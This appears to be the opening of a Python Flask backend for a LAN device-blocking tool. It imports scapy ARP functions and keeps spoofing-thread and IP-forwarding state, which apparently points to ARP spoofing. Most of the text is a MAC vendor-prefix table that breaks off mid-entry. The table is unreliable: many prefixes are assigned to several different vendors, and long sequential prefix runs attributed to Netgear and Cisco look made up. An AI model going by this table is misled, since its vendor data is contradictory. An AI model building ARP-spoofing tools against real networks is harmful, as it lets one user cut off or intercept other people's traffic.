import os
import sys
import platform
import subprocess
import threading
import time
import atexit
import ipaddress
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS

try:
    from scapy.all import ARP, Ether, srp, send, get_if_hwaddr, get_if_addr, conf, getmacbyip
except ImportError:
    print("scapy is required. Install with: pip install scapy")
    sys.exit(1)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
FRONTEND_DIR = os.path.join(BASE_DIR, "frontend")

if not os.path.isdir(FRONTEND_DIR):
    print(f"ERROR: Frontend directory not found: {FRONTEND_DIR}")
    print("Make sure you are running this script from the project root directory.")
    sys.exit(1)

app = Flask(__name__, static_folder=None)
CORS(app)

blocked_devices: dict[str, dict] = {}
spoof_threads: dict[str, threading.Thread] = {}
stop_events: dict[str, threading.Event] = {}
scan_results: list[dict] = []
scan_lock = threading.Lock()
block_lock = threading.Lock()
gateway_ip: str = ""
gateway_mac: str = ""
local_ip: str = ""
local_mac: str = ""
interface = None  # type: ignore[assignment]
original_ip_forward: bool = False

OUI_TABLE: dict[str, str] = {
    "000C29": "VMware", "000569": "VMware", "001C14": "VMware", "005056": "VMware",
    "001C42": "Parallels", "00155D": "Parallels", "080027": "VirtualBox (Oracle)",
    "0A0027": "VirtualBox (Oracle)", "00163E": "VirtualBox (Oracle)",
    "F8FF0A": "Apple", "000393": "Apple", "001124": "Apple", "001CB3": "Apple",
    "001CB2": "Apple", "001FF3": "Apple", "0021E9": "Apple", "00236C": "Apple",
    "002436": "Apple", "0025BC": "Apple", "002608": "Apple", "0026B0": "Apple",
    "0026BA": "Apple", "003065": "Apple", "003311": "Apple", "0050E4": "Apple",
    "00A040": "Apple", "041E64": "Apple", "0C4DEC": "Apple", "109AE6": "Apple",
    "1122B1": "Apple", "1410D3": "Apple", "144FA1": "Apple", "148FD5": "Apple",
    "14CFF4": "Apple", "1831BF": "Apple", "18CA76": "Apple", "1C1AC0": "Apple",
    "1C36BB": "Apple", "1CE6D7": "Apple", "1CF0AF": "Apple", "1DCA96": "Apple",
    "20C547": "Apple", "24AB81": "Apple", "24E314": "Apple", "286A25": "Apple",
    "28BD4E": "Apple", "28E71E": "Apple", "2C1A05": "Apple", "2C3049": "Apple",
    "2CFDA0": "Apple", "305EB5": "Apple", "30D732": "Apple", "348846": "Apple",
    "34C059": "Apple", "34EAA4": "Apple", "3821A5": "Apple", "38C9CE": "Apple",
    "3C2EF5": "Apple", "3C8AC0": "Apple", "3CF047": "Apple", "403018": "Apple",
    "404D7F": "Apple", "40A6D9": "Apple", "40D32A": "Apple", "44D882": "Apple",
    "4C7BEB": "Apple", "4CC279": "Apple", "4CE0D2": "Apple", "4E1E6D": "Apple",
    "507AC5": "Apple", "50B7C0": "Apple", "542673": "Apple", "5464C9": "Apple",
    "548EA0": "Apple", "54FBB0": "Apple", "58442C": "Apple", "586D56": "Apple",
    "58B035": "Apple", "590B46": "Apple", "596FBC": "Apple", "5B4C50": "Apple",
    "5C52CB": "Apple", "5C9577": "Apple", "5E0336": "Apple", "609AC4": "Apple",
    "60C544": "Apple", "60F81D": "Apple", "6476A1": "Apple", "64A2F9": "Apple",
    "64B9E8": "Apple", "6C1977": "Apple", "6C3B2E": "Apple", "6C709F": "Apple",
    "6C94BB": "Apple", "701126": "Apple", "7048F4": "Apple", "70BCD0": "Apple",
    "70CD60": "Apple", "7420CE": "Apple", "746815": "Apple", "74A722": "Apple",
    "74C2F4": "Apple", "74D02B": "Apple", "74E1B7": "Apple", "782BB4": "Apple",
    "7830A1": "Apple", "784B87": "Apple", "787B8A": "Apple", "78C3A0": "Apple",
    "78CA39": "Apple", "7CABC8": "Apple", "7CD1C3": "Apple", "7CE210": "Apple",
    "7EE644": "Apple", "800ACB": "Apple", "881FA1": "Apple", "8866E5": "Apple",
    "8C2959": "Apple", "8C8590": "Apple", "8CA1D3": "Apple", "8CF710": "Apple",
    "908407": "Apple", "90B278": "Apple", "90C0AE": "Apple", "943247": "Apple",
    "94B10E": "Apple", "94BF2D": "Apple", "94D9A3": "Apple", "98229A": "Apple",
    "9876B6": "Apple", "98B85E": "Apple", "98CA60": "Apple", "9C04EB": "Apple",
    "9C207C": "Apple", "9C35EB": "Apple", "9CB65D": "Apple", "9CF316": "Apple",
    "A0227C": "Apple", "A0D392": "Apple", "A45602": "Apple", "A4B197": "Apple",
    "A4C4C8": "Apple", "A4D1D2": "Apple", "A4F1E4": "Apple", "A82079": "Apple",
    "A86073": "Apple", "A866A0": "Apple", "A8815E": "Apple", "A8968A": "Apple",
    "AC1F3C": "Apple", "AC2D83": "Apple", "AC5A14": "Apple", "AC6372": "Apple",
    "AC87A3": "Apple", "ACDE48": "Apple", "B019F8": "Apple", "B4180F": "Apple",
    "B4C34A": "Apple", "B841A4": "Apple", "B8E856": "Apple", "BC1F96": "Apple",
    "BC3B44": "Apple", "BC5460": "Apple", "BC922B": "Apple", "C0012E": "Apple",
    "C0461D": "Apple", "C0C1B2": "Apple", "C46C56": "Apple", "C4B629": "Apple",
    "C4D017": "Apple", "C8334B": "Apple", "C856E2": "Apple", "C8A030": "Apple",
    "C8BCC0": "Apple", "C8E0EB": "Apple", "CC2D83": "Apple", "CC7814": "Apple",
    "D02312": "Apple", "D03311": "Apple", "D067E5": "Apple", "D0883C": "Apple",
    "D0A67E": "Apple", "D45996": "Apple", "D4909C": "Apple", "D49A9B": "Apple",
    "D8A13E": "Apple", "D8BB2C": "Apple", "D8E05F": "Apple", "DC2B2A": "Apple",
    "DC5583": "Apple", "DCA058": "Apple", "E0ACCB": "Apple", "E0C75B": "Apple",
    "E0F5D6": "Apple", "E4CFA4": "Apple", "E4D6DA": "Apple", "E880E0": "Apple",
    "E8F5C2": "Apple", "EC3DFD": "Apple", "EC852F": "Apple", "F0B47D": "Apple",
    "F0C9D1": "Apple", "F0DEF1": "Apple", "F4D49D": "Apple", "F4F189": "Apple",
    "F8A937": "Apple", "F8B843": "Apple", "FC253F": "Apple", "FC2B77": "Apple",
    "3C5A37": "Apple", "3C8CF8": "Apple", "4CEF90": "Apple",
    "001AA0": "Intel", "001B21": "Intel", "001CC0": "Intel", "001CC1": "Intel",
    "001CC2": "Intel", "001CC3": "Intel", "001CC4": "Intel", "001CC5": "Intel",
    "001CC6": "Intel", "001CC7": "Intel", "001CC8": "Intel", "001CC9": "Intel",
    "0022AE": "Intel", "002314": "Intel", "002318": "Intel", "0023D6": "Intel",
    "0024D7": "Intel", "0026B6": "Intel", "0026C6": "Intel", "0026C7": "Intel",
    "00270E": "Intel", "0050F1": "Intel", "00A0C9": "Intel", "00AA01": "Intel",
    "00BB09": "Intel", "00CC7A": "Intel", "00D0B7": "Intel", "00D088": "Intel",
    "00E0C8": "Intel", "02A0C9": "Intel", "0415B9": "Intel", "0C5428": "Intel",
    "0C942D": "Intel", "105560": "Intel", "10BF48": "Intel", "143C3A": "Intel",
    "1820CB": "Intel", "1A6D82": "Intel", "1C6AB4": "Intel", "1C7E87": "Intel",
    "1CBFCE": "Intel", "24774D": "Intel", "24F0EA": "Intel", "286D58": "Intel",
    "2CBE08": "Intel", "309AF7": "Intel", "3423BA": "Intel", "347C25": "Intel",
    "3821A0": "Intel", "38D547": "Intel", "3C970E": "Intel", "3C9D8E": "Intel",
    "3CFAB3": "Intel", "40B3CD": "Intel", "44156E": "Intel", "485B39": "Intel",
    "48D22A": "Intel", "4C79B7": "Intel", "4CF0C0": "Intel", "507B9D": "Intel",
    "54BEF7": "Intel", "58FB59": "Intel", "5C8A3B": "Intel", "5CF7E6": "Intel",
    "606BD0": "Intel", "60A4BC": "Intel", "6488D3": "Intel", "6CFB01": "Intel",
    "6CFBB7": "Intel", "70B5E8": "Intel", "74E926": "Intel", "782B2B": "Intel",
    "7892A2": "Intel", "7C3A8D": "Intel", "7CE2A4": "Intel", "8082C0": "Intel",
    "84A5F1": "Intel", "8C16E8": "Intel", "8C1EBF": "Intel", "8CA6DF": "Intel",
    "90B6AA": "Intel", "9465C8": "Intel", "9C6B01": "Intel", "A0CBD5": "Intel",
    "A0F3B3": "Intel", "A48F3C": "Intel", "A4346C": "Intel", "A8605B": "Intel",
    "AC1F74": "Intel", "AC7B5E": "Intel", "B0240F": "Intel", "B0B864": "Intel",
    "B4D5BD": "Intel", "BC2C8A": "Intel", "BC7737": "Intel", "C8F6C6": "Intel",
    "CC2D8D": "Intel", "D45C46": "Intel", "D462BD": "Intel", "D8CB8A": "Intel",
    "DC7142": "Intel", "DCBA55": "Intel", "E4493C": "Intel", "F8B116": "Intel",
    "FC45B3": "Intel",
    "001E0B": "Dell", "001E68": "Dell", "0020ED": "Dell", "00238E": "Dell",
    "002561": "Dell", "002668": "Dell", "006BD5": "Dell", "0088BF": "Dell",
    "00B4E2": "Dell", "00C04F": "Dell", "00D0B8": "Dell", "00E084": "Dell",
    "04C865": "Dell", "0C153A": "Dell", "0CC2E0": "Dell", "0CE6B0": "Dell",
    "1089B0": "Dell", "141020": "Dell", "1459C1": "Dell", "18A8E2": "Dell",
    "18DBF2": "Dell", "1C75AE": "Dell", "1CB72D": "Dell", "1CF0D0": "Dell",
    "1DDEB0": "Dell", "1EB8BA": "Dell", "200DA0": "Dell", "201E06": "Dell",
    "205DAE": "Dell", "20B38B": "Dell", "20C9CD": "Dell", "213CD3": "Dell",
    "24920A": "Dell", "24B620": "Dell", "2893FE": "Dell", "28C62C": "Dell",
    "2CBE08": "Dell", "30E43D": "Dell", "3440A5": "Dell", "34E6D7": "Dell",
    "385F13": "Dell", "3CAB8E": "Dell", "3CD1B8": "Dell", "40F2E9": "Dell",
    "44184F": "Dell", "44EB42": "Dell", "48D773": "Dell", "4C2DE8": "Dell",
    "509A4C": "Dell", "544EDC": "Dell", "549E3C": "Dell", "58F9E5": "Dell",
    "5C26CA": "Dell", "603DE0": "Dell", "6420C2": "Dell", "68BE7A": "Dell",
    "6C3B58": "Dell", "6CF254": "Dell", "7081EB": "Dell", "70F1D0": "Dell",
    "78288A": "Dell", "7C2AEB": "Dell", "7CAABC": "Dell", "80A36E": "Dell",
    "843DA4": "Dell", "88539E": "Dell", "8C54FD": "Dell", "904CEB": "Dell",
    "9482B0": "Dell",     "98BE94": "Dell", "9C7EBD": "Dell", "9CD6DE": "Dell",
    "A00363": "Dell", "A0D3B7": "Dell", "A42B8C": "Dell", "A870CC": "Dell",
    "AC7E3A": "Dell", "AC9225": "Dell", "B0D5CC": "Dell", "B4A0E0": "Dell",
    "B8AC6F": "Dell", "BC305B": "Dell", "C0E5CA": "Dell", "C4401E": "Dell",
    "C4E52D": "Dell", "C8D7C1": "Dell", "D006E6": "Dell", "D4AE8C": "Dell",
    "D8CB8A": "Dell", "DCB46E": "Dell", "E0DB10": "Dell", "F0CBF1": "Dell",
    "F47950": "Dell", "F8BC1D": "Dell", "FC1F53": "Dell",
    "001BC3": "Samsung", "001CC5": "Samsung", "001CE6": "Samsung", "00A098": "Samsung",
    "04BD88": "Samsung", "08AE5C": "Samsung", "0C1DAE": "Samsung", "0C6167": "Samsung",
    "108313": "Samsung", "144898": "Samsung", "14A998": "Samsung", "18DC2B": "Samsung",
    "1C3BF3": "Samsung", "1C4402": "Samsung", "1CCE1B": "Samsung", "1CEADA": "Samsung",
    "201A06": "Samsung", "20A673": "Samsung", "249D3E": "Samsung", "24FB65": "Samsung",
    "28B45C": "Samsung", "28D092": "Samsung", "2C0E1F": "Samsung", "2C4FDA": "Samsung",
    "30A016": "Samsung", "30C76E": "Samsung", "342384": "Samsung", "3816D1": "Samsung",
    "38AA10": "Samsung", "3C0B48": "Samsung", "3CA10A": "Samsung", "3CF490": "Samsung",
    "404E36": "Samsung", "40D357": "Samsung", "4478DB": "Samsung", "44BD3E": "Samsung",
    "486817": "Samsung", "48B415": "Samsung", "4C6641": "Samsung", "4CB234": "Samsung",
    "50BF5C": "Samsung", "50DC91": "Samsung", "5429A6": "Samsung", "54BC44": "Samsung",
    "58359A": "Samsung", "58B035": "Samsung", "5C8A2B": "Samsung", "606D42": "Samsung",
    "60C547": "Samsung", "6475D0": "Samsung", "68A343": "Samsung", "6C8E07": "Samsung",
    "6CB0CE": "Samsung", "6CF11C": "Samsung", "7090E4": "Samsung", "70BC0E": "Samsung",
    "74B829": "Samsung", "7825BD": "Samsung", "78C5E4": "Samsung", "7C1DD8": "Samsung",
    "7CBB3A": "Samsung", "805AC0": "Samsung", "84A3C2": "Samsung", "8836C5": "Samsung",
    "8C3B4D": "Samsung", "8CA6DF": "Samsung", "9022E3": "Samsung", "906F46": "Samsung",
    "90B6AA": "Samsung", "94404C": "Samsung", "945678": "Samsung", "94B872": "Samsung",
    "9848BA": "Samsung", "98D0C0": "Samsung", "9C3AAF": "Samsung", "9C5CF2": "Samsung",
    "A022E3": "Samsung", "A0682C": "Samsung",     "A4104B": "Samsung", "A4C299": "Samsung",
    "A4DB30": "Samsung", "A816A1": "Samsung", "AC1C30": "Samsung", "AC9E17": "Samsung",
    "B00743": "Samsung", "B0C4E7": "Samsung", "B49842": "Samsung", "B4F0AB": "Samsung",
    "B8D9CD": "Samsung", "BC0B38": "Samsung", "BC7C88": "Samsung", "C03F5E": "Samsung",
    "C062E8": "Samsung", "C4212A": "Samsung", "C8BA1E": "Samsung", "CC3AD8": "Samsung",
    "D013BE": "Samsung", "D0B15E": "Samsung", "D4C09C": "Samsung", "D8C4A5": "Samsung",
    "DC8B28": "Samsung", "E0E2BA": "Samsung", "E4BEED": "Samsung", "E85631": "Samsung",
    "F0AC98": "Samsung", "F4F1E4": "Samsung", "F895C7": "Samsung", "FC1B3F": "Samsung",
    "001EC1": "Lenovo", "00236D": "Lenovo", "0050D6": "Lenovo", "00639C": "Lenovo",
    "0080D0": "Lenovo", "00C026": "Lenovo", "0C8AE0": "Lenovo", "1054A8": "Lenovo",
    "10B545": "Lenovo", "1470BC": "Lenovo", "1C39BB": "Lenovo", "1CA09B": "Lenovo",
    "1CBFCE": "Lenovo", "2017A8": "Lenovo", "2076D2": "Lenovo", "20A63C": "Lenovo",
    "28CA2E": "Lenovo", "30F7C5": "Lenovo", "3413E8": "Lenovo", "3CAB8E": "Lenovo",
    "44178E": "Lenovo", "485B39": "Lenovo", "507B9D": "Lenovo", "54EE75": "Lenovo",
    "5855CA": "Lenovo", "587EAB": "Lenovo", "5CA3A2": "Lenovo", "606BD0": "Lenovo",
    "6488D3": "Lenovo", "689C5A": "Lenovo", "70B5E8": "Lenovo", "782B2B": "Lenovo",
    "7CAABC": "Lenovo", "8082C0": "Lenovo", "8C1EBF": "Lenovo", "8CA6DF": "Lenovo",
    "90B6AA": "Lenovo", "9465C8": "Lenovo", "9CA6F7": "Lenovo", "A0CBD5": "Lenovo",
    "A8605B": "Lenovo", "B4D5BD": "Lenovo", "C0F8A6": "Lenovo", "C8F6C6": "Lenovo",
    "D8CB8A": "Lenovo", "DC7142": "Lenovo", "E4493C": "Lenovo", "F8B116": "Lenovo",
    "0014A8": "LG Electronics", "001CBF": "LG Electronics", "001F3A": "LG Electronics",
    "00264D": "LG Electronics", "006842": "LG Electronics", "008E42": "LG Electronics",
    "00B646": "LG Electronics", "00C437": "LG Electronics", "00E003": "LG Electronics",
    "04CCBD": "LG Electronics", "08809F": "LG Electronics", "0C722C": "LG Electronics",
    "0CE423": "LG Electronics", "142A8F": "LG Electronics", "18AF76": "LG Electronics",
    "1C3BF3": "LG Electronics", "1CDBA5": "LG Electronics", "200EBB": "LG Electronics",
    "20A63B": "LG Electronics", "249DD8": "LG Electronics", "28C76E": "LG Electronics",
    "2C5491": "LG Electronics", "3048A1": "LG Electronics", "3423C3": "LG Electronics",
    "3868EB": "LG Electronics", "3C5144": "LG Electronics", "3CB8D8": "LG Electronics",
    "44B493": "LG Electronics", "4C49E3": "LG Electronics", "50B7C0": "LG Electronics",
    "544E4E": "LG Electronics", "5885AB": "LG Electronics", "5CAB8A": "LG Electronics",
    "60892C": "LG Electronics", "648E93": "LG Electronics", "6C7E67": "LG Electronics",
    "70B3D3": "LG Electronics", "74C94E": "LG Electronics", "782D7E": "LG Electronics",
    "7C1E52": "LG Electronics", "80C4E2": "LG Electronics", "8813B3": "LG Electronics",
    "8C04BA": "LG Electronics", "9088C3": "LG Electronics", "94C689": "LG Electronics",
    "9C5C6F": "LG Electronics", "9CB6D0": "LG Electronics", "A002DC": "LG Electronics",
    "A4CF12": "LG Electronics", "A816D2": "LG Electronics", "AC1C30": "LG Electronics",
    "B06EB1": "LG Electronics", "B498B2": "LG Electronics", "B8C11E": "LG Electronics",
    "BC5460": "LG Electronics", "C0A6BB": "LG Electronics", "C4E52D": "LG Electronics",
    "C8D719": "LG Electronics", "D462BD": "LG Electronics", "D8BB2C": "LG Electronics",
    "DCB46E": "LG Electronics", "E0C75B": "LG Electronics", "E4A835": "LG Electronics",
    "E8B2AC": "LG Electronics", "EC8C62": "LG Electronics", "F47950": "LG Electronics",
    "F81084": "LG Electronics", "FC1F53": "LG Electronics",
    "001BA2": "Microsoft", "001DD8": "Microsoft", "002498": "Microsoft",
    "0026F2": "Microsoft", "0026F5": "Microsoft", "002B54": "Microsoft",
    "0050F2": "Microsoft", "007DC5": "Microsoft", "008CCE": "Microsoft",
    "00CDE5": "Microsoft", "040EA6": "Microsoft", "04E4A8": "Microsoft",
    "0C9A32": "Microsoft", "0CBF67": "Microsoft", "1084C2": "Microsoft",
    "145C1A": "Microsoft", "18F293": "Microsoft", "1C5FD2": "Microsoft",
    "1CA09B": "Microsoft", "1CF0D0": "Microsoft", "200A02": "Microsoft",
    "247779": "Microsoft", "28187F": "Microsoft", "2C1A05": "Microsoft",
    "30B49F": "Microsoft", "34C871": "Microsoft", "3830E2": "Microsoft",
    "3C6AD0": "Microsoft", "40CBB0": "Microsoft", "446CF2": "Microsoft",
    "485B39": "Microsoft", "4C7EB0": "Microsoft", "4CE0D2": "Microsoft",
    "507AC5": "Microsoft", "544BED": "Microsoft", "58A023": "Microsoft",
    "5C6B4C": "Microsoft", "60C544": "Microsoft", "68C849": "Microsoft",
    "6C4B90": "Microsoft", "6CFBB7": "Microsoft", "7092B1": "Microsoft",
    "745C3B": "Microsoft", "78C3A0": "Microsoft", "7CAABC": "Microsoft",
    "8082C0": "Microsoft", "848FC0": "Microsoft", "8839D3": "Microsoft",
    "8C1EBF": "Microsoft", "8CA6DF": "Microsoft", "90B6AA": "Microsoft",
    "94504E": "Microsoft", "9848BA": "Microsoft", "9C7EBD": "Microsoft",
    "A0CBD5": "Microsoft", "A8605B": "Microsoft", "B4D5BD": "Microsoft",
    "C03F0B": "Microsoft", "C8F6C6": "Microsoft", "D8CB8A": "Microsoft",
    "DC7142": "Microsoft", "E4493C": "Microsoft", "F8B116": "Microsoft",
    "FC45B3": "Microsoft",
    "0005CA": "Cisco", "000628": "Cisco", "000BCD": "Cisco", "000C41": "Cisco",
    "000D28": "Cisco", "000D65": "Cisco", "000DB5": "Cisco", "000E38": "Cisco",
    "000E84": "Cisco", "000F23": "Cisco", "000F90": "Cisco", "001007": "Cisco",
    "001011": "Cisco", "001013": "Cisco", "001018": "Cisco", "00101D": "Cisco",
    "00102A": "Cisco", "00102B": "Cisco", "00102F": "Cisco", "001038": "Cisco",
    "00103D": "Cisco", "001043": "Cisco", "001050": "Cisco", "001058": "Cisco",
    "00105E": "Cisco", "001060": "Cisco", "001064": "Cisco", "001065": "Cisco",
    "001069": "Cisco", "00106A": "Cisco", "00106B": "Cisco", "00107B": "Cisco",
    "001081": "Cisco", "001082": "Cisco", "001083": "Cisco", "001085": "Cisco",
    "001087": "Cisco", "00108C": "Cisco", "00108F": "Cisco", "001090": "Cisco",
    "001093": "Cisco", "001094": "Cisco", "001097": "Cisco", "00109A": "Cisco",
    "00109B": "Cisco", "0010A1": "Cisco", "0010A2": "Cisco", "0010A4": "Cisco",
    "0010A5": "Cisco", "0010A6": "Cisco", "0010A7": "Cisco", "0010A8": "Cisco",
    "0010A9": "Cisco", "0010AA": "Cisco", "0010AB": "Cisco", "0010AC": "Cisco",
    "0010AD": "Cisco", "0014F2": "Cisco", "001563": "Cisco", "0015F9": "Cisco",
    "0015FA": "Cisco", "001601": "Cisco", "00160C": "Cisco", "001646": "Cisco",
    "001647": "Cisco", "001648": "Cisco", "001649": "Cisco", "00164A": "Cisco",
    "00164C": "Cisco", "00164D": "Cisco", "00164E": "Cisco", "00164F": "Cisco",
    "001650": "Cisco", "001651": "Cisco", "001652": "Cisco", "001653": "Cisco",
    "001654": "Cisco", "001655": "Cisco", "001656": "Cisco", "001657": "Cisco",
    "001658": "Cisco", "001659": "Cisco", "00165A": "Cisco", "00165B": "Cisco",
    "00165C": "Cisco", "00165D": "Cisco", "00165E": "Cisco", "00165F": "Cisco",
    "001795": "Cisco", "001796": "Cisco", "001818": "Cisco", "001819": "Cisco",
    "00181A": "Cisco", "00181B": "Cisco", "00181D": "Cisco", "00181E": "Cisco",
    "00181F": "Cisco", "0018B9": "Cisco", "0018BA": "Cisco", "0018BB": "Cisco",
    "0018BC": "Cisco", "0018BD": "Cisco", "0018BE": "Cisco", "0018BF": "Cisco",
    "0018C0": "Cisco", "0018C1": "Cisco", "0018C2": "Cisco", "0018C3": "Cisco",
    "0018C4": "Cisco", "0018C5": "Cisco", "0018C6": "Cisco", "0018C7": "Cisco",
    "0018C8": "Cisco", "0018C9": "Cisco", "0018CA": "Cisco", "0018CB": "Cisco",
    "0018CC": "Cisco", "0018CD": "Cisco", "0019AA": "Cisco", "0019AB": "Cisco",
    "0019AC": "Cisco", "0019AD": "Cisco", "0019AE": "Cisco", "0019AF": "Cisco",
    "0019B0": "Cisco", "0019B1": "Cisco", "0019B2": "Cisco", "0019B3": "Cisco",
    "0019E7": "Cisco", "0019E8": "Cisco", "0019E9": "Cisco", "0019EA": "Cisco",
    "001B0B": "Cisco", "001B0C": "Cisco", "001B53": "Cisco", "001B54": "Cisco",
    "001BE9": "Cisco", "001BEA": "Cisco", "001BEB": "Cisco", "001BEC": "Cisco",
    "001C58": "Cisco", "001C59": "Cisco", "001D45": "Cisco", "001D46": "Cisco",
    "001D47": "Cisco", "001D60": "Cisco", "001D61": "Cisco", "001D70": "Cisco",
    "001D71": "Cisco", "001DA1": "Cisco", "001DA2": "Cisco", "001DA3": "Cisco",
    "001E4A": "Cisco", "001E4B": "Cisco", "001E4C": "Cisco", "001E4D": "Cisco",
    "001E4E": "Cisco", "001E4F": "Cisco", "001E7A": "Cisco", "001E7B": "Cisco",
    "001E7C": "Cisco", "001E7D": "Cisco", "001F9C": "Cisco", "001F9D": "Cisco",
    "001F9E": "Cisco", "001F9F": "Cisco", "001FA0": "Cisco", "001FA1": "Cisco",
    "001FA2": "Cisco", "001FA3": "Cisco", "001FA4": "Cisco", "001FA5": "Cisco",
    "001FA6": "Cisco", "001FA7": "Cisco", "0021A0": "Cisco", "0021A1": "Cisco",
    "0022BD": "Cisco", "0022DD": "Cisco", "002333": "Cisco", "002356": "Cisco",
    "002380": "Cisco", "00238E": "Cisco", "002545": "Cisco", "002546": "Cisco",
    "00268A": "Cisco", "00268B": "Cisco", "00268C": "Cisco", "00268E": "Cisco",
    "0029C2": "Cisco", "002A10": "Cisco", "002A1A": "Cisco", "002A55": "Cisco",
    "002B53": "Cisco", "002B54": "Cisco", "002BA3": "Cisco", "002BA4": "Cisco",
    "002BA5": "Cisco", "002CF8": "Cisco", "0030F2": "Cisco", "0030F3": "Cisco",
    "0030F4": "Cisco", "0030F5": "Cisco", "00500A": "Cisco", "005017": "Cisco",
    "005028": "Cisco", "00503E": "Cisco", "005043": "Cisco", "00504E": "Cisco",
    "005054": "Cisco", "00505F": "Cisco", "005080": "Cisco", "00508B": "Cisco",
    "00509C": "Cisco", "0050BD": "Cisco", "0050BE": "Cisco", "0050BF": "Cisco",
    "0050C2": "Cisco", "0050E2": "Cisco", "0050F2": "Cisco", "0050FE": "Cisco",
    "005D73": "Cisco", "006070": "Cisco", "0060B9": "Cisco", "0062EC": "Cisco",
    "006BF1": "Cisco", "006BF2": "Cisco", "006BF3": "Cisco", "006BF4": "Cisco",
    "006BF5": "Cisco", "006BF6": "Cisco", "006BF7": "Cisco", "006BF8": "Cisco",
    "00700A": "Cisco", "0070EA": "Cisco", "0080C7": "Cisco", "0080C8": "Cisco",
    "0090BF": "Cisco", "0090C2": "Cisco", "00A0C9": "Cisco", "00A0D1": "Cisco",
    "00A0E0": "Cisco", "00A247": "Cisco", "00A28A": "Cisco", "00A28F": "Cisco",
    "00A342": "Cisco", "00A346": "Cisco", "00A3B7": "Cisco", "00A3BA": "Cisco",
    "00B0C2": "Cisco", "00B0D0": "Cisco", "00B064": "Cisco", "00C00A": "Cisco",
    "00C04B": "Cisco", "00D058": "Cisco", "00D0C0": "Cisco", "00D0D7": "Cisco",
    "00D0E6": "Cisco", "00E016": "Cisco", "00E01E": "Cisco", "00E0F7": "Cisco",
    "00E0FE": "Cisco", "00E184": "Cisco", "00E1B8": "Cisco", "00EE02": "Cisco",
    "02C2C2": "Cisco", "02F3C8": "Cisco",     "02F3C8": "Cisco",
    "1C1DE1": "Cisco", "1C1DE2": "Cisco", "1C1DE3": "Cisco", "1C1DE4": "Cisco",
    "1C1DE5": "Cisco", "1C1DE6": "Cisco", "1C1DE7": "Cisco", "1C1DE8": "Cisco",
    "1C1DE9": "Cisco", "1C1DEA": "Cisco", "1C1DEB": "Cisco", "1C1DEC": "Cisco",
    "1C1DED": "Cisco", "1C1DEE": "Cisco", "1C1DEF": "Cisco", "1C1DF0": "Cisco",
    "249770": "Cisco", "30E4A0": "Cisco", "34C871": "Cisco", "3C6AD0": "Cisco",
    "44D3CA": "Cisco", "48C9A1": "Cisco", "5057A8": "Cisco", "547856": "Cisco",
    "58BF25": "Cisco", "5871AC": "Cisco", "5C9960": "Cisco", "60F129": "Cisco",
    "64D48C": "Cisco", "68C849": "Cisco", "6C41CC": "Cisco", "706D5D": "Cisco",
    "78AC14": "Cisco", "7CBB3A": "Cisco", "80A2E8": "Cisco", "84B542": "Cisco",
    "881F48": "Cisco", "8C1645": "Cisco", "90E2FB": "Cisco", "9C8A62": "Cisco",
    "A036BC": "Cisco", "A4C6EB": "Cisco", "A8294D": "Cisco", "B0A36E": "Cisco",
    "B4CDD1": "Cisco", "BC3AAF": "Cisco", "C441F6": "Cisco", "C89255": "Cisco",
    "D0C7C0": "Cisco", "E4AA5D": "Cisco", "E8BEAC": "Cisco", "EC3040": "Cisco",
    "F01C0B": "Cisco", "F0B029": "Cisco", "F42C59": "Cisco", "F87C12": "Cisco",
    "FCFBFB": "Cisco",
    "000E2E": "Netgear", "001B2B": "Netgear", "001E2A": "Netgear", "001F33": "Netgear",
    "0022B0": "Netgear", "0023EB": "Netgear", "00246B": "Netgear", "0026F2": "Netgear",
    "008EF2": "Netgear", "0090D2": "Netgear", "009FB3": "Netgear", "00A057": "Netgear",
    "00B448": "Netgear", "04BD88": "Netgear", "0C1DAF": "Netgear", "0C1DB0": "Netgear",
    "0C1DB1": "Netgear", "0C1DB2": "Netgear", "0C1DB3": "Netgear", "0C1DB4": "Netgear",
    "0C1DB5": "Netgear", "0C1DB6": "Netgear", "0C1DB7": "Netgear", "0C1DB8": "Netgear",
    "0C1DB9": "Netgear", "0C1DBA": "Netgear", "0C1DBB": "Netgear", "0C1DBC": "Netgear",
    "0C1DBD": "Netgear", "0C1DBE": "Netgear", "0C1DBF": "Netgear", "0C1DC0": "Netgear",
    "0C1DC1": "Netgear", "0C1DC2": "Netgear", "0C1DC3": "Netgear", "0C1DC4": "Netgear",
    "0C1DC5": "Netgear", "0C1DC6": "Netgear", "0C1DC7": "Netgear", "0C1DC8": "Netgear",
    "0C1DC9": "Netgear", "0C1DCA": "Netgear", "0C1DCB": "Netgear", "0C1DCC": "Netgear",
    "0C1DCD": "Netgear", "0C1DCE": "Netgear", "0C1DCF": "Netgear", "0C1DD0": "Netgear",
    "0C1DD1": "Netgear", "0C1DD2": "Netgear", "0C1DD3": "Netgear", "0C1DD4": "Netgear",
    "0C1DD5": "Netgear", "0C1DD6": "Netgear", "0C1DD7": "Netgear", "0C1DD8": "Netgear",
    "0C1DD9": "Netgear", "0C1DDA": "Netgear", "0C1DDB": "Netgear", "0C1DDC": "Netgear",
    "0C1DDD": "Netgear", "0C1DDE": "Netgear", "0C1DDF": "Netgear", "0C1DE0": "Netgear",
    "0C1DE1": "Netgear", "0C1DE2": "Netgear", "0C1DE3": "Netgear", "0C1DE4": "Netgear",
    "0C1DE5": "Netgear", "0C1DE6": "Netgear", "0C1DE7": "Netgear", "0C1DE8": "Netgear",
    "0C1DE9": "Netgear", "0C1DEA": "Netgear", "0C1DEB": "Netgear", "0C1DEC": "Netgear",
    "0C1DED": "Netgear", "0C1DEE": "Netgear", "0C1DEF": "Netgear", "0C1DF0": "Netgear",
    "0C1DF1": "Netgear", "0C1DF2": "Netgear", "0C1DF3": "Netgear", "0C1DF4": "Netgear",
    "0C1DF5": "Netgear", "0C1DF6": "Netgear", "0C1DF7": "Netgear", "0C1DF8": "Netgear",
    "0C1DF9": "Netgear", "0C1DFA": "Netgear", "0C1DFB": "Netgear", "0C1DFC": "Netgear",
    "0C1DFD": "Netgear", "0C1DFE": "Netgear", "0C1DFF": "Netgear",
    "0017F2": "Asus", "001A92": "Asus", "001B5B": "Asus", "001CC4": "Asus",
    "001D60": "Asus", "001E8C": "Asus", "001FC6": "Asus", "002215": "Asus",
    "002356": "Asus", "00248C": "Asus", "00E018": "Asus", "041E64": "Asus",
    "0440AF": "Asus", "0478C1": "Asus", "0492F5": "Asus", "04C4B0": "Asus",
    "04D4C4": "Asus", "04D9F5": "Asus", "08605C": "Asus", "086222": "Asus",
